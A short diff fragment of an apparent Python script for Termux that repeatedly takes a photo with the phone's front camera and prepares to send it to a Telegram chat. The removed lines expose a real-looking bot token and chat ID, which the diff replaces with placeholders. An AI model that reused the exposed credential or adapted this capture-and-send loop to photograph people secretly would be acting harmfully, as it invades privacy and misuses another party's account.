@@ -52,10 +52,10 @@ def looper():
                     os.system (f"termux-camera-photo -c1 image.jpeg")
                     
 # Replace 'YOUR_BOT_TOKEN' with your actual bot token
-                    bot_token = '6906665400:AAGl9hmiD_zKVGxznbyyvKzYYQ4oEOlJbr0'
+                    bot_token = ' ' # add bot token telegram
 
 # Replace 'chat_id' with the actual chat ID where you want to send the image
-                    chat_id = '2108751290'
+                    chat_id = '' # add chat id telegram
 
 # your image file
                     image_path = 'image.jpeg'
